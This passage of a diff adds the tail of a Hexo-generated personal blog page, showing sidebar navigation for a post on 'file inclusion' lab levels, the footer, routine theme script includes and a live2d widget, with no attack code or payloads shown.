nav-level-2"><a class="nav-link" href="#file-inclusion"><span class="nav-number">2.</span> <span class="nav-text">file inclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low-1"><span class="nav-number">2.1.</span> <span class="nav-text">low</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium-1"><span class="nav-number">2.2.</span> <span class="nav-text">medium</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high-1"><span class="nav-number">2.3.</span> <span class="nav-text">high</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible-1"><span class="nav-number">2.4.</span> <span class="nav-text">impossible</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#心得-1"><span class="nav-number">2.5.</span> <span class="nav-text">心得</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">misaka</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博主已经辛辛苦苦滴码了2.5k字，加油</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+    <script type="text/javascript" src="/live2d/script.js"></script>
+    <canvas id="live2dcanvas" width="150" height="300" class="live2d"></canvas>
+    <style>
+      #live2dcanvas {
+        position: fixed;
+        right: 0px;
+        z-index: 999;
+        pointer-events: none;
+        bottom: -60px;
+      }
+    </style>
+    <script>loadlive2d("live2dcanvas" ,"/live2d/assets/tororo/tororo.model.json",0.5)</script>
+  	
+</body>
+</html>
